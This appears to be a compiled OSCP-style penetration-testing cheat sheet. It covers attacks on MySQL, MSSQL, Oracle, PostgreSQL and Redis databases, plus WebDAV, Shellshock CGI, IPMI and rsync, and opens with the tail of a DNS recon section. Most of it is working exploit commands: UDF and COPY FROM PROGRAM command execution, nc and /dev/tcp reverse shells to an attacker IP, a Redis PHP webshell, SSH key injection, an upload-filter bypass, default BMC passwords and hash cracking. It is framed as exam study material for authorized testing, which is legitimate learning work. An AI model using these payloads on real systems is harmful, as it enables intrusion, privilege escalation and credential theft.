- [Hackercool Magazine – Complete guide to DNSenum](https://hackercoolmagazine.com/complete-guide-to-dnsenum/)
- [Kali Tools – fierce](https://www.kali.org/tools/fierce/)
- [fierce-domain-scanner (bbhunter mirror)](https://github.com/bbhunter/fierce-domain-scanner)
- [Gobuster – DNS subdomain enumeration](https://gobuster.org/can-gobuster-be-used-for-subdomain-enumeration/)
- [HackerTarget – Gobuster Tutorial](https://hackertarget.com/gobuster-tutorial/)
- [rootusers.com – 12 dig Command Examples](https://www.rootusers.com/12-dig-command-examples-to-query-dns-in-linux/)
- [howtouselinux.com – Reverse DNS lookups in Linux](https://www.howtouselinux.com/post/reverse-dns-lookup)
- [AlbaITPro – Check LDAP DNS Using NSLOOKUP](https://albarich.wordpress.com/2018/02/16/check-ldap-dns-using-nslookup/)
- [The Hacker Recipes – AD DNS Recon](https://www.thehacker.recipes/ad/recon/dns)
- [en.ittrip.xyz – Fix Domain Join Failures / AD DNS SRV Records](https://en.ittrip.xyz/windows-server/ad-dns-srv-domain-join)

---

**Note on scope of this research:** This report only compiles publicly documented, standard DNS reconnaissance commands and techniques as taught in OSCP-aligned study material (dig/host/dnsrecon/dnsenum/fierce/gobuster syntax and AD SRV-record queries). No exploitation, credential collection, or targeting of any real, non-consented infrastructure was performed — all example domains (`example.com`, `zonetransfer.me`, `corp.local`) are placeholders or purpose-built public training targets.
---
## Database Enumeration & Exploitation (MySQL/MSSQL/Oracle/PostgreSQL/Redis)

Research compiled from HackTricks, PayloadsAllTheThings, Impacket source, ODAT wiki, Hacking Articles, and community OSCP cheat sheets. All commands below are attacker-side, run against a target you are authorized to test.

---

## 1. MySQL / MariaDB (3306)

### Overview
MySQL is enumerated with the native `mysql` CLI client. Once authenticated with sufficient privileges (`FILE` + writable `plugin_dir`/`secure_file_priv`), the classic escalation path is loading a malicious **User Defined Function (UDF)** shared object so MySQL executes OS commands as the account the `mysqld` process runs under (frequently `root` on misconfigured Linux boxes).

### Findings

**Connect with the mysql client**
```bash
mysql -h <target-ip> -u root -p
mysql -h <target-ip> -u <user> -p<password>          # inline password, no space after -p
mysql -h <target-ip> -P 3306 -u <user> -p<password> <database>
mysql -h <target-ip> -u <user> --password=<password> -e "SHOW DATABASES;"
```
Connects to the remote instance; the `-e` flag runs a single query non-interactively, useful for scripting enumeration.

**Core enumeration queries**
```sql
SHOW DATABASES;
SELECT version();
SELECT current_user();
SHOW GRANTS FOR CURRENT_USER();
SELECT user, host, authentication_string FROM mysql.user;   -- password col is `password` on old MySQL
SHOW GRANTS FOR 'someuser'@'%';
SELECT @@secure_file_priv;
SHOW VARIABLES LIKE 'plugin_dir';
SELECT LOAD_FILE('/etc/passwd');
SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php';
```
Reveals databases, the running user's actual privileges, hash storage, and the two settings (`secure_file_priv`, `plugin_dir`) that gate file read/write and UDF-based privilege escalation. `LOAD_FILE`/`INTO OUTFILE` require the `FILE` privilege and a `secure_file_priv` value that permits the target path.

**UDF privilege escalation — compile raptor_udf2**
```bash
# raptor_udf2.c from exploit-db 1518 / PrivEsc repo
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Compiles the classic `do_system()` UDF shared object as position-independent code required for a `.so` MySQL will load.

**Load the UDF into MySQL and execute commands**
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  -- use SHOW VARIABLES LIKE 'plugin_dir'; path
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('id > /tmp/out; chmod +s /bin/bash');
```
Writes the compiled `.so` from the DB row into the server's `plugin_dir` via `dumpfile`, registers it as a callable SQL function, then invokes arbitrary OS commands as the MySQL service account.

**Alternative UDF library — lib_mysqludf_sys**
```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out; nc -e /bin/sh <attacker-ip> 4444');
```
`sys_exec`/`sys_eval` from the `lib_mysqludf_sys` project is the payload `sqlmap --os-shell` uploads automatically when it detects `FILE` privileges on MySQL — same net effect as raptor_udf2 but pre-built.

**sudo mysql escape / interactive shell escape**
```bash
sudo mysql -e '\! /bin/sh'
# inside an interactive client session:
mysql> \! /bin/bash
```
If MySQL is runnable via `sudo`, the `\!` meta-command shells out using the client's inherited (root) privileges — no UDF compilation needed.

### Tools table
| Tool | Purpose |
|---|---|
| `mysql` (official client) | Interactive/scripted DB connection and query execution |
| `raptor_udf2.c` (Exploit-DB 1518) | Compiles to `do_system()` UDF for Linux root privesc |
| `lib_mysqludf_sys` | Pre-built `sys_exec`/`sys_eval` UDF library |
| `sqlmap --os-shell` | Automates UDF upload + OS shell over a SQLi/DB connection |
| `hashcat` / `john` | Cracks `mysql.user` password hashes once dumped |

---

## 2. MSSQL (1433)

### Overview
On Linux attack hosts, `mssqlclient.py` (Impacket) is the standard connector, supporting SQL auth, Windows auth, NTLM hashes, and Kerberos. Once connected, `xp_cmdshell` is the primary OS command-execution vector (disabled by default, re-enabled via `sp_configure`), and misconfigured **linked servers** let an attacker pivot laterally/escalate by executing commands under the linked login's — often sysadmin — context.

### Findings

**Connect with impacket mssqlclient.py**
```bash
mssqlclient.py DOMAIN/user:password@<target-ip>
mssqlclient.py <user>@<target-ip> -windows-auth
mssqlclient.py -hashes LMHASH:NTHASH DOMAIN/<user>@<target-ip> -windows-auth
mssqlclient.py -k -no-pass DOMAIN/<user>@<target-fqdn> -dc-ip <dc-ip>
mssqlclient.py <user>@<target-ip> -port 1433
```
`-windows-auth` forces NTLM/Windows authentication instead of SQL auth; `-hashes` performs pass-the-hash; `-k -no-pass` uses Kerberos from an existing ccache (`KRB5CCNAME`).

**Enable and use xp_cmdshell (mssqlclient built-in commands)**
```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> disable_xp_cmdshell
```
`enable_xp_cmdshell` runs the `sp_configure` toggling internally (see manual form below) and enables direct `xp_cmdshell <command>` execution from the shell prompt.

**Manually enable xp_cmdshell via raw SQL**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';
```
Required when using a client other than mssqlclient (e.g. sqlcmd, a web-based SQLi) — advanced options must be exposed before `xp_cmdshell` itself can be toggled.

**Faster (nxc):** `nxc mssql` auto-enables `xp_cmdshell` and runs a command in one step, skipping the manual `sp_configure`/`enable_xp_cmdshell` dance above:
```
nxc mssql <target-ip> -u <user> -p <pass> -x "whoami"
nxc mssql <target-ip> -u <user> -p <pass> -X "whoami"        # PowerShell instead of cmd
```

**Enumerate and use linked servers (mssqlclient built-ins)**
```
SQL> enum_links
SQL> use_link [LINKEDSERVERNAME]
SQL> use_link localhost      -- return to the local server
```
`enum_links` lists configured linked servers; `use_link` pivots subsequent queries/commands to execute in the context of the linked server's mapped login.

**Manual linked server enumeration**
```sql
SELECT srvname, isremote FROM master..sysservers;
EXEC sp_linkedservers;
SELECT * FROM openquery("linked-server", 'select * from master..sysservers');
```
Reveals every configured link, and (via nested `openquery`) reachable second-hop servers beyond the current instance.

**Linked server command execution via OPENQUERY**
```sql
SELECT * FROM OPENQUERY("LINKEDSERVER", 'select @@servername; exec master..xp_cmdshell ''whoami''');
```
`OPENQUERY` officially can't run extended procedures directly, but chaining a `SELECT` before `; exec ...` inside the quoted remote batch bypasses that restriction, running `xp_cmdshell` as the linked login.

**Linked server command execution via EXECUTE...AT (multi-hop capable)**
```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT [LINKEDSERVER];
EXECUTE('exec master..xp_cmdshell ''whoami''') AT [LINKEDSERVER];
-- nested/multi-hop through a chain of trusted links:
EXECUTE('EXECUTE(''exec master..xp_cmdshell ''''whoami'''''') AT [SERVER2]') AT [SERVER1];
```
`EXEC ... AT` sends a full batch to the remote server (unlike `OPENQUERY`, no `SELECT` trick needed) and can be nested to hop across chains of linked servers with trust relationships.

**Impersonation escalation (EXECUTE AS)**
```sql
SELECT name, is_disabled FROM sys.server_principals;
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;
```
If the current login has `IMPERSONATE` rights on a higher-privileged login (commonly `sa`), `EXECUTE AS LOGIN` elevates the session's effective server role to sysadmin without a password; `REVERT` drops back.

`mssqlclient.py` built-in shortcut (same SQL_SHELL used for `enum_links`/`use_link` above): `exec_as_login {login}` / `exec_as_user {user}` runs the equivalent `EXECUTE AS LOGIN`/`EXECUTE AS USER` directly from the prompt, e.g. `SQL> exec_as_login sa`.

**Faster (nxc):** the `mssql_priv` check module enumerates and exploits impersonation-based privesc (including chained `EXECUTE AS`) without hand-writing the SQL above:
```
nxc mssql <target-ip> -u <user> -p <pass> -M mssql_priv
```

### Tools table
| Tool | Purpose |
|---|---|
| `mssqlclient.py` (Impacket) | SQL/Windows-auth/hash/Kerberos MSSQL connection, built-in `xp_cmdshell`/link commands |
| `sqlcmd` | Native MS client, alternate manual query execution |
| PowerUpSQL (`Get-SQLServerLink`, `Get-SQLServerLinkCrawl`) | Windows-side automated linked-server crawling/RCE chaining |
| `xp_cmdshell` | Built-in extended proc for OS command execution |
| Metasploit `mssql_*` modules | Automated login brute-force, `xp_cmdshell` enabling. **Exam caveat: like all Metasploit modules, restricted to the single machine you've designated for Metasploit use on exam day — `mssqlclient.py`/manual `xp_cmdshell` enabling above are the exam-safe, reusable alternative.** |

---

## 3. Oracle (1521/1522, TNS Listener)

### Overview
ODAT (Oracle Database Attacking Tool) automates Oracle-specific reconnaissance (SID/credential guessing) and turns valid credentials into file read/write and OS command execution via built-in Oracle packages (`UTL_FILE`, `DBMS_XSLPROCESSOR`, external tables, `DBMS_SCHEDULER`, Java stored procs).

### Findings

**SID discovery (brute-force via TNS listener)**
```bash
python3 odat.py sidguesser -s <target-ip> -p 1521
odat sidguesser -s <target-ip> -d <SID> --sids-file=./sids.txt
```
Brute-forces valid Oracle System Identifiers against the TNS listener when the SID is unknown; `--sids-file` supplies a custom wordlist instead of the built-in one.

**Credential guessing**
```bash
python3 odat.py passwordguesser -s <target-ip> -d <SID>
odat passwordguesser -s <target-ip> -p 1521 --accounts-files accounts/logins.txt accounts/pwds.txt
```
Tries built-in default Oracle account/password pairs (`scott/tiger`, `system/manager`, etc.) or a custom login/password file combination against the discovered SID.

**Run every module against found/known credentials**
```bash
odat all -s <target-ip> -p 1521 --sids-max-size=3 --sid-charset='abc'
odat all -s <target-ip> -p 1521 -d <SID> -U <user> -P <password>
```
The `all` module chains SID guessing, password guessing, and every exploitation module in sequence — the fastest way to fully triage an unknown Oracle target.

**File upload / RCE via UTL_FILE**
```bash
odat utlfile -s <target-ip> -d <SID> -U <user> -P <password> --sysdba --putFile 'C:/windows/temp/' shell.exe /local/path/shell.exe
```
Writes a local file to the target's filesystem using `UTL_FILE` package privileges (requires either explicit grants or `--sysdba` to bypass restrictions).

**File upload via DBMS_XSLPROCESSOR**
```bash
odat dbmsxslprocessor -s <target-ip> -d <SID> -U <user> -P <password> --putFile /tmp/ evil.sh /local/evil.sh
```
Abuses `DBMS_XSLPROCESSOR.READ2CLOB`/write primitives to drop a file server-side even when `UTL_FILE` isn't directly usable.

**Remote command execution via EXTERNALTABLE**
```bash
odat externaltable -s <target-ip> -d <SID> -U <user> -P <password> --exec /tmp/ shell.sh
```
Creates an Oracle external table pointing at an executable already staged (or uploaded) server-side and triggers it — note it cannot pass arguments, the target file must already have the execute bit set, and must live on the DB server.

**Privileged (SYSDBA) connection flag**
```bash
odat all -s <target-ip> -d <SID> -U sys -P <password> --sysdba
```
`--sysdba` connects `AS SYSDBA`, bypassing many role-based restrictions once the `sys`/DBA account's password is known — usually the pivot point for full OS command execution.

### Tools table
| Tool | Purpose |
|---|---|
| `odat` (quentinhardy/odat) | End-to-end Oracle SID/credential guessing + exploitation (UTL_FILE, DBMS_XSLPROCESSOR, EXTERNALTABLE, DBMS_SCHEDULER, Java) |
| `tnscmd10g` | Legacy TNS listener enumeration/version/PING |
| `sqlplus` | Native Oracle client for manual query verification after odat gains creds |
| Nmap `oracle-tns-version` NSE | Passive TNS/version fingerprinting |

---

## 4. PostgreSQL (5432)

### Overview
`psql` is the native client. The headline OSCP technique is **`COPY ... FROM/TO PROGRAM`**, which — for superusers or members of `pg_execute_server_program` (PostgreSQL ≥ 9.3) — executes arbitrary shell commands on the database host, either exfiltrating output through a temp table or spawning a reverse shell directly.

### Findings

**Connect with psql**
```bash
psql -h <target-ip> -U <username> -d <database>
PGPASSWORD='<password>' psql -h <target-ip> -p 5432 -U <username> -d <database>
psql -h <target-ip> -p 5432 -U <username> -W <database>
```
`PGPASSWORD` avoids the interactive password prompt for scripting; `-W` forces the prompt explicitly.

**Core enumeration**
```sql
\l                                   -- list databases
\du                                  -- list roles/users
\c <dbname>                          -- switch database
\dt                                  -- list tables
SELECT version();
SELECT current_user;
SELECT usename, usesuper FROM pg_user;
SHOW is_superuser;
SELECT current_setting('is_superuser');
```
Confirms server version (for CVE matching), enumerates accounts, and — critically — checks whether the current session already has superuser rights needed for `COPY ... PROGRAM`.

**RCE via COPY FROM PROGRAM (command execution + output capture)**
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
```
Runs an arbitrary OS command and pipes its stdout into a table row so the result can be read back over the SQL session — the standard "read-the-output" pattern.

**Reverse shell via COPY FROM PROGRAM**
```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> <attacker-port> >/tmp/f';
```
Uses the classic named-pipe `nc` reverse-shell one-liner as the "program" COPY executes, giving an interactive shell on the DB host as the postgres OS user.

**Privilege check requirement (why it works)**
```sql
SELECT rolname FROM pg_roles WHERE pg_has_role('<current_user>', oid, 'member') AND rolname='pg_execute_server_program';
```
Since PG 9.3, `COPY ... PROGRAM` is restricted to superusers and members of the `pg_execute_server_program` role — verify this before attempting the technique to avoid a permission-denied error tipping off logs.

**Metasploit automation**
```
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <target-ip>
set USERNAME <user>
set PASSWORD <password>
set PAYLOAD cmd/unix/reverse
run
```
Automates the same `COPY FROM PROGRAM` technique against valid, sufficiently-privileged credentials without hand-writing the SQL. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine you've locked in for Metasploit use and cannot be run against additional targets — the manual `COPY ... FROM PROGRAM` SQL above works everywhere and should be the default technique.**

### Tools table
| Tool | Purpose |
|---|---|
| `psql` | Native interactive client for connection and enumeration |
| `COPY ... FROM/TO PROGRAM` (built-in SQL) | RCE primitive for superusers / `pg_execute_server_program` members |
| Metasploit `postgres_copy_from_program_cmd_exec` | Automated exploitation of the above |
| `pg_dump` / `pg_dumpall` | Bulk data/credential exfiltration once access confirmed |

---

## 5. Redis (6379)

### Overview
Redis frequently ships with **no authentication** by default. Once reachable, `INFO`/`CONFIG GET *` fingerprint the instance, and `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE` lets an attacker write attacker-controlled key data to arbitrary filesystem paths — the basis for both the webshell-drop technique and the `authorized_keys` SSH-key injection technique.

### Findings

**Connect / detect unauthenticated access**
```bash
redis-cli -h <target-ip> -p 6379 PING
redis-cli -h <target-ip> INFO
redis-cli -h <target-ip> CONFIG GET *
```
A `PONG` with no `AUTH` prompt, plus a full `INFO`/`CONFIG GET *` dump (version, working directory, persistence settings), confirms the instance is fully exposed and unauthenticated.

**Webshell drop via CONFIG SET / SAVE**
```
redis-cli -h <target-ip>
> config set dir /var/www/html
> config set dbfilename shell.php
> set x "<?php system($_GET['cmd']); ?>"
> save
```
Repoints Redis's RDB persistence directory and filename to the web root and a `.php` name, stores the PHP webshell payload as a string value, then `SAVE` forces Redis to flush its in-memory dataset to disk — writing the value (plus RDB binary framing bytes the PHP interpreter ignores) as `shell.php`.

**SSH key injection into authorized_keys**
```bash
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h <target-ip> -x set ssh_key
redis-cli -h <target-ip> config set dir /root/.ssh/
redis-cli -h <target-ip> config set dbfilename authorized_keys
redis-cli -h <target-ip> save
ssh -i id_rsa root@<target-ip>
```
Generates an attacker keypair, pads the public key with newlines (so surrounding RDB binary garbage doesn't corrupt the entry, since `authorized_keys` parsing tolerates unparsable lines), imports it as a Redis string value via `-x` (reads stdin), then repeats the `dir`/`dbfilename`/`save` trick against `/root/.ssh/authorized_keys` — landing a passwordless root SSH login if Redis runs as root.

**SSRF-to-RCE variant (gopher protocol, for blind/internal Redis)**
```
gopher://<redis-ip>:6379/_*1%0d%0a%2432%0d%0a...   (gopherus-generated payload encoding
                                                     CONFIG SET / SET / SAVE as raw RESP commands)
```
Where direct TCP access isn't available but an SSRF primitive supporting the `gopher://` scheme is, the same `CONFIG SET dir` / `SET key` / `SAVE` command sequence is encoded as a raw Redis protocol (RESP) payload and delivered through the SSRF — tools like `gopherus` or `redis-ssrf` automate the encoding.

### Tools table
| Tool | Purpose |
|---|---|
| `redis-cli` | Native interactive/one-shot Redis client |
| `gopherus` | Generates gopher:// payloads to weaponize SSRF into blind Redis RCE |
| `redis-ssh` (LevitatingBusinessMan) | Automates the authorized_keys injection chain |
| Metasploit `auxiliary/scanner/redis/file_upload` / `auxiliary/scanner/redis/redis_login` | Automated auth brute-force and file-write exploitation. **Exam caveat: like all Metasploit modules, restricted to the single machine you've designated for Metasploit use on exam day — the manual `CONFIG SET`/`SAVE` technique above is the exam-safe, reusable default.** |

---

## Summary Tools Table (Cross-Service)

| Service | Primary Client | Primary Escalation Tool | Key Native Primitive |
|---|---|---|---|
| MySQL | `mysql` | `raptor_udf2.c` / `lib_mysqludf_sys` / `sqlmap --os-shell` | `CREATE FUNCTION ... SONAME` (UDF) |
| MSSQL | `mssqlclient.py` (Impacket) | PowerUpSQL, built-in `xp_cmdshell` | `xp_cmdshell`, linked server `OPENQUERY`/`EXEC AT` |
| Oracle | `sqlplus` | `odat` | `UTL_FILE`, `DBMS_XSLPROCESSOR`, `EXTERNALTABLE`, `--sysdba` |
| PostgreSQL | `psql` | Metasploit `postgres_copy_from_program_cmd_exec` | `COPY ... FROM/TO PROGRAM` |
| Redis | `redis-cli` | `gopherus` / `redis-ssh` | `CONFIG SET dir/dbfilename` + `SAVE` |

**Note on currency:** All techniques above (UDF privesc, MSSQL linked-server/xp_cmdshell abuse, ODAT's Oracle package abuse, Postgres `COPY PROGRAM`, and Redis unauth `CONFIG SET`/`SAVE`) remain standard, unpatched-by-design *misconfiguration* techniques as of 2026 — they exploit intended administrative functionality rather than a single patchable CVE, which is why they persist in current OSCP-style material.

---

## WebDAV (TCP 80/443)

### Overview
WebDAV (Web Distributed Authoring and Versioning) extends HTTP with PUT, MOVE, COPY, DELETE, MKCOL, and PROPFIND methods, enabling remote file management over a web server. On OSCP-style targets — especially IIS boxes — WebDAV is a common foothold vector because it allows uploading files to the web root. The classic exploitation pattern is uploading a harmless file type (`.txt`) via PUT, then renaming it to an executable extension (`.aspx`, `.php`) via MOVE to bypass extension-based upload filters.

### Findings

**1. Detection — nmap WebDAV scan**
```bash
nmap --script http-webdav-scan -p 80 <target>
nmap --script http-webdav-scan -p 443 <target>
```
The `http-webdav-scan` NSE script sends an `OPTIONS` request and reports which WebDAV methods the server advertises (PUT, MOVE, COPY, DELETE, MKCOL, PROPFIND, etc.), confirming WebDAV is enabled and which operations are permitted.

**2. Detection — davtest (upload capability testing)**
```bash
davtest -url http://<target>/webdav/
davtest -url http://<target>/webdav/ -auth <user>:<password>
```
`davtest` automatically tests which file types (`.txt`, `.html`, `.asp`, `.aspx`, `.php`, `.jsp`, `.pl`, `.cgi`, etc.) can be uploaded to the WebDAV directory and which of those uploaded files are then executable by the web server — a one-shot triage of both upload and execution permissions per extension.

**3. Enumeration — interactive WebDAV shell with cadaver**
```bash
cadaver http://<target>/webdav/
```
Opens an interactive FTP-like shell for browsing, uploading, downloading, and managing files on the WebDAV share. Supports `ls`, `put`, `get`, `move`, `copy`, `delete`, `mkcol` (create directory) commands. Useful for manual exploration once WebDAV access is confirmed.

**4. Exploitation — PUT + MOVE bypass (IIS extension filter evasion)**
```bash
# Step 1: Upload payload as a permitted file type (.txt)
curl -X PUT http://<target>/webdav/cmd.txt -d '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami > C:\\inetpub\\wwwroot\\webdav\\output.txt"); %>'

# Step 2: Rename to an executable extension (.aspx) via MOVE
curl -X MOVE -H 'Destination: http://<target>/webdav/cmd.aspx' http://<target>/webdav/cmd.txt
```
Many IIS WebDAV configurations block direct upload of `.aspx`/`.asp` files but allow `.txt`. The MOVE method renames the uploaded file server-side without re-checking the extension filter — a well-documented IIS misconfiguration that persists in OSCP-style lab environments. After the MOVE, browsing to `http://<target>/webdav/cmd.aspx` triggers the payload. The same technique applies to `.php` on Apache/nginx WebDAV setups.

**5. Authenticated WebDAV upload with curl**
```bash
curl -X PUT http://<target>/webdav/shell.aspx -d @shell.aspx -u '<user>:<password>'
```
When WebDAV requires authentication (common on Windows/IIS with Basic or NTLM auth), pass credentials with `-u`. If the server accepts the extension directly (no filter), the PUT + MOVE two-step is unnecessary.

**nxc note:** NetExec does not have a native WebDAV module — use `curl`, `cadaver`, or `davtest` for WebDAV interaction.

### Tools table
| Tool | Purpose |
|---|---|
| `nmap` (`http-webdav-scan` NSE) | Detect WebDAV support and advertised methods |
| `davtest` | Automated upload + execution testing per file extension |
| `cadaver` | Interactive WebDAV shell (browse, upload, download, move) |
| `curl` | Manual PUT/MOVE/DELETE requests for precise exploitation |

---

## CGI-bin / Shellshock (CVE-2014-6271)

### Overview
Shellshock (CVE-2014-6271) exploits a flaw in Bash's handling of environment variables — specifically, function definitions passed through environment variables are not properly terminated, allowing an attacker to append arbitrary commands that execute when the shell is invoked. CGI scripts (`.sh`, `.pl`, `.cgi`) served by Apache/nginx via `mod_cgi`/`mod_cgid` are the primary attack surface because HTTP headers (User-Agent, Referer, Cookie, Accept-Language, and any custom header) are passed to the CGI process as environment variables, giving remote unauthenticated command execution if the server-side shell is a vulnerable Bash version (< 4.3 patch 25).

### Findings

**1. Discovery — brute force CGI script paths**
```bash
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x sh,pl,cgi
```
Brute forces the `/cgi-bin/` directory for common CGI script names with shell/Perl/CGI extensions. Finding a valid script (200 response) is the prerequisite — Shellshock requires a specific CGI endpoint to inject through.

**2. Discovery — nmap Shellshock detection**
```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/status.sh -p 80 <target>
```
The `http-shellshock` NSE script sends the Shellshock payload in the User-Agent header and checks for evidence of command execution in the response. `uri=` must point to a known/discovered CGI script path — the script does not brute force paths on its own.

**3. Detection — manual curl test**
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://<target>/cgi-bin/script.sh
```
The payload `() { :; };` is a function definition that Bash parses from the environment variable; the trailing `echo; /usr/bin/id` is the injected command that executes after the function definition due to the parsing flaw. The leading `echo;` outputs a blank line that acts as the HTTP header/body separator, ensuring the command output appears in the response body. A successful response showing `uid=...` confirms the target is vulnerable.

**4. Exploitation — reverse shell via User-Agent**
```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" http://<target>/cgi-bin/script.sh
```
Replaces the detection payload with a standard Bash reverse shell one-liner. Set up a listener (`nc -lvnp 4444`) before sending. The shell runs as the web server user (typically `www-data` or `apache`).

**5. Alternative injectable headers**
```bash
# Referer header
curl -H "Referer: () { :; }; /usr/bin/id > /var/www/html/output.txt" http://<target>/cgi-bin/script.sh

# Cookie header
curl -H "Cookie: () { :; }; /usr/bin/id > /tmp/output.txt" http://<target>/cgi-bin/script.sh
```
Any HTTP header that the web server maps into the CGI environment is a valid injection point — not just User-Agent. Referer, Cookie, Accept-Language, and custom headers all reach the CGI process as environment variables. If User-Agent-based injection is filtered/WAF-blocked, try other headers.

### Tools table
| Tool | Purpose |
|---|---|
| `gobuster` | Brute force `/cgi-bin/` for valid CGI script paths |
| `nmap` (`http-shellshock` NSE) | Automated Shellshock detection against a known CGI endpoint |
| `curl` | Manual header injection for detection and exploitation |
| `nmap` (`http-enum` NSE) | Generic web content discovery that may find `/cgi-bin/` entries |

---

## IPMI (UDP 623)

### Overview
IPMI (Intelligent Platform Management Interface) on UDP 623 provides out-of-band hardware management (BMC — Baseboard Management Controller). IPMI 2.0's RAKP (Remote Authenticated Key-Exchange Protocol) authentication handshake has a protocol-level design flaw: during the RAKP Message 2 exchange, the BMC sends a salted HMAC derived from the user's password hash back to any client that initiates authentication — **by design, not by misconfiguration** — allowing offline cracking of BMC user passwords without ever completing a login. Default credentials are also extremely common on BMCs.

### Findings

**1. Detection — nmap IPMI version scan**
```bash
nmap -sU -p 623 --script ipmi-version <target>
```
Confirms the IPMI service is listening on UDP 623 and reports the IPMI protocol version (1.5 or 2.0). IPMI 2.0 is the version vulnerable to the RAKP hash-disclosure technique below.

**2. IPMI 2.0 RAKP hash dumping**
```bash
# Metasploit (lab/HTB only — exam: single-target restriction applies)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
run
```
The `ipmi_dumphashes` module initiates RAKP authentication handshakes for a list of common usernames (or a custom wordlist) and captures the HMAC-SHA1/HMAC-MD5 hash the BMC returns in RAKP Message 2. These hashes can then be cracked offline. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine designated for Metasploit use — consider whether the IPMI host is that machine before running.**

**3. ipmitool — authenticated enumeration**
```bash
ipmitool -I lanplus -H <target> -U admin -P admin user list
ipmitool -I lanplus -H <target> -U admin -P admin user summary
ipmitool -I lanplus -H <target> -U admin -P admin lan print 1
ipmitool -I lanplus -H <target> -U admin -P admin chassis status
```
Once valid credentials are obtained (via cracking or defaults), `ipmitool` enumerates BMC users, network configuration, and hardware status. `-I lanplus` uses the IPMI 2.0 (RMCP+) interface.

**4. Default credentials to try**
| Vendor | Username | Password |
|---|---|---|
| Generic / Supermicro | `ADMIN` | `ADMIN` |
| Generic | `admin` | `admin` |
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | (set during setup, but often `Administrator`) |
| Generic | `Administrator` | `Administrator` |

Always try these before attempting hash dumping — BMC default credentials are left unchanged far more often than they should be.

**5. Cracking IPMI RAKP hashes**
```bash
hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
```
Hashcat mode `7300` handles IPMI2 RAKP HMAC-SHA1 hashes. The hash format output by Metasploit's `ipmi_dumphashes` module is directly compatible with hashcat without reformatting.

### Tools table
| Tool | Purpose |
|---|---|
| `nmap` (`ipmi-version` NSE) | Detect IPMI service and protocol version |
| Metasploit `ipmi_dumphashes` | Capture RAKP password hashes via the protocol-level flaw |
| `ipmitool` | Authenticated BMC interaction (user enum, config, chassis control) |
| `hashcat` (`-m 7300`) | Crack captured IPMI 2.0 RAKP hashes offline |

---

## Rsync (TCP 873)

### Overview
Rsync (TCP 873) is a file synchronization service that can expose named "modules" — each mapping to a server-side directory path. When modules are configured without authentication (`auth users` / `secrets file` not set), any client can list, download, and potentially upload files. On OSCP-style targets, anonymous rsync access frequently leaks configuration files, SSH keys, credentials, or provides write access to web roots or home directories.

### Findings

**1. Detection — nmap rsync module listing**
```bash
nmap -p 873 --script rsync-list-modules <target>
```
The `rsync-list-modules` NSE script connects to the rsync daemon and lists all advertised module names — equivalent to the manual listing below but integrated into an nmap scan workflow.

**2. Module listing — rsync native client**
```bash
rsync --list-only rsync://<target>/
```
Connects to the rsync daemon on port 873 and lists all available modules (share names). Each module name maps to a server-side directory configured in `/etc/rsyncd.conf`. Modules may or may not require authentication — the listing itself is typically unauthenticated.

**3. Anonymous download — entire module contents**
```bash
rsync -av rsync://<target>/module_name/ ./loot/
```
Recursively downloads the entire contents of a module to a local directory. `-a` preserves permissions/timestamps/symlinks (archive mode); `-v` enables verbose output. If the module is not password-protected, this is effectively anonymous read access to the mapped directory.

**4. List files in a module without downloading**
```bash
rsync --list-only rsync://<target>/module_name/
rsync --list-only -r rsync://<target>/module_name/
```
The first form lists top-level contents; adding `-r` recurses into subdirectories. Useful for triaging what's available before downloading everything.

**5. Check for writable modules (upload test)**
```bash
rsync ./test.txt rsync://<target>/module_name/test.txt
```
Attempts to upload a small test file to the module. If it succeeds (no error), the module is writable — a direct path to dropping webshells (if the module maps to a web root), planting SSH keys (if it maps to a home directory), or modifying configuration files.

**6. Authenticated access**
```bash
rsync -av rsync://username@<target>/module_name/ ./loot/
```
When a module requires authentication, rsync prompts for the password. Credentials may be found in other loot, or common defaults can be tried.

**7. Key files to look for after download**
Once a module's contents are downloaded, prioritize:
- SSH keys: `id_rsa`, `id_ed25519`, `authorized_keys`, `.ssh/` directories
- Configuration files: `.htpasswd`, `wp-config.php`, `web.config`, `shadow`, `passwd`
- Credential stores: `.bash_history`, `.my.cnf`, `.pgpass`, `.env`, `credentials.xml`
- Web roots: if the module maps to `/var/www/html` or similar, upload a webshell via the writable-module technique above

### Tools table
| Tool | Purpose |
|---|---|
| `nmap` (`rsync-list-modules` NSE) | Detect rsync and list available modules |
| `rsync` (native client) | List modules, browse contents, download/upload files |

